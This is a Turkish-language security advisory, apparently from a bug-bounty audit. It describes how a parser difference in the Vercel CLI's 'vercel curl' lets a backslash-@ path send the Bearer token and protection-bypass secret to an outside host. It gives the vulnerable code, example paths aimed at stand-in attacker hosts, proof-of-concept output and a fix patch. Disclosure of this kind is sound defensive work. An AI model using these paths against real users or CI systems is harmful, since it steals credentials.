# Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Ters Eğik Çizgi / Süslü Parantez Ayrıştırıcı Farkı İle Canlı Bearer Token ve `x-vercel-protection-bypass` Sızıntısı (`VERCEL-CLI-07`)

[English](../41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md) | **Türkçe** | [日本語](../ja/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md) | [简体中文](../zh-CN/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md) | [한국어](../ko/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)

## 1. Açığın Özeti ve Kodda Nasıl Zafiyete Dönüştüğü (`Herkesin Anlayabileceği Adım Adım Teknik Mekanizma`)

### Adım Adım Teknik Mekanizma
1. **Adım 1 — WHATWG `new URL()` İle `libcurl` (`curl_url_set`) Arasındaki Ters Eğik Çizgi (`\\@`) Ayrıştırıcı Farkı (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` fonksiyonu `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...` kontrolünü yaptıktan sonra normalize edilmiş `url.href` yerine **ham metin birleştirmesini** (`return \`${baseUrl}${normalizedPath}\``) döndürür. `path` olarak `\\@attacker.example/collect` verildiğinde WHATWG `new URL()` bunu aynı kökenli bir dizin yolu sayarken, `/usr/bin/curl` ikili dosyasına giden `https://my-app.vercel.app\\@attacker.example/collect` dizgesi `libcurl` tarafından `my-app.vercel.app\\` kullanıcı adıyla **`attacker.example`** sunucusuna yapılan bir istek olarak ayrıştırılır!
2. **Adım 2 — `libcurl` Globbing (`{a,b}`) ve `--next` Bayrak Farkı (`utils.ts:34-42`):** `@attacker.example/{a,b}` yolu WHATWG `URL` tarafından bağıl dizin olarak görülürken `libcurl` globbing motoru tarafından dış sunucu isteğine dönüştürülür.
3. **Adım 3 — Canlı `Authorization: Bearer` ve `x-vercel-protection-bypass` Sırlarının Dış Sunucuya Gönderilmesi (`utils.ts:74-96`):** `vercel curl`, oluşturulan `curl` sürecine otomatik olarak `--header "Authorization: Bearer <VERCEL_TOKEN>"` ve `x-vercel-protection-bypass` başlıklarını eklediği için tüm kimlik bilgileri doğrudan saldırganın sunucusuna akar.

### Zafiyetli Kod Kesiti
```typescript
// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
export function constructFullUrl(baseUrl: string, path: string): string {
  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
  const url = new URL(normalizedPath, baseUrl);
  if (url.origin !== baseUrl) {
    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
  }
  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
  return `${baseUrl}${normalizedPath}`;
}
```

---

## 2. Günlük Hayatta Yol Açabileceği Kritik Senaryolar (`Senaryo A` / `Senaryo B` / `Senaryo C`)

### Senaryo A — CI/CD PR Önizleme Test Hattında Canlı Vercel Token ve Bypass Sırrının Çalınması
CI/CD hattında çalışan `vercel curl "$PREVIEW_PATH"` komutuna `\\@127.0.0.1:41992/exfil` verildiğinde `constructFullUrl()` kontrolünden geçer; ancak `/usr/bin/curl` doğrudan saldırgan sunucusuna bağlanarak `Authorization: Bearer vcp_live_...` ve `x-vercel-protection-bypass` sırlarını teslim eder.

### Senaryo B — Geliştirici Terminali veya AI Ajanı Üzerinden Kimlik Bilgisi Sızıntısı
Korumalı bir Vercel dağıtımını test eden geliştirici veya AI ajanı `vercel curl '\@logs-collector.example/api/debug'` çalıştırdığında canlı Vercel API anahtarı dış sunucuya sızar.

### Senaryo C — Otomatik Üretilen Proje Geneli Bypass Sırrının Sızması (`FINDING-07B`)
`ensureProtectionBypassSecret()` fonksiyonu `PATCH /v10/projects/{id}/protection-bypass` ile kalıcı bir proje bypass sırrı üretir ve aynı istekte dış sunucuya sızdırır.

---

## 3. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları

```bash
# 1. Inspect constructFullUrl in published vercel@65.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'

# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
```

---

## 4. Uçtan Uca Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`) ve Savunma Yaması

Vercel & Next.js Canlı npm Paketi Doğrulama Süiti ile üretilen çalışma zamanı kanıtı (bkz. [`vercel-real-world-impact-e2e-20261029.json`](../vercel-real-world-impact-e2e-20261029.json)):

```json
{
  "VERCEL-CLI-07": {
    "RED": {
      "package_tested": "vercel@65.4.0",
      "curl_binary": "/usr/bin/curl 8.5.0",
      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
      "whatwg_origin_check_passed": true,
      "attacker_listener_received_request": true,
      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
    },
    "GREEN": {
      "backslash_and_at_segment_rejected": true,
      "returns_normalized_url_href": true,
      "curl_invoked_with_globoff": true,
      "attacker_listener_received_request": false
    }
  }
}
```

### Birleştirilmiş Savunma Yaması (`git apply --check` temiz)
```diff
--- a/packages/cli/src/commands/curl/utils.ts
+++ b/packages/cli/src/commands/curl/utils.ts
@@ -183,6 +183,9 @@ export function constructFullUrl(baseUrl: string, path: string): string {
+  if (path.includes('\\') || /^\/+@/.test(normalizedPath)) {
+    throw new Error(`Invalid path "${path}": contains ambiguous authority characters`);
+  }
   const url = new URL(normalizedPath, baseUrl);
   if (url.origin !== baseUrl) {
     throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
   }
-  return `${baseUrl}${normalizedPath}`;
+  return url.href;
 }
```
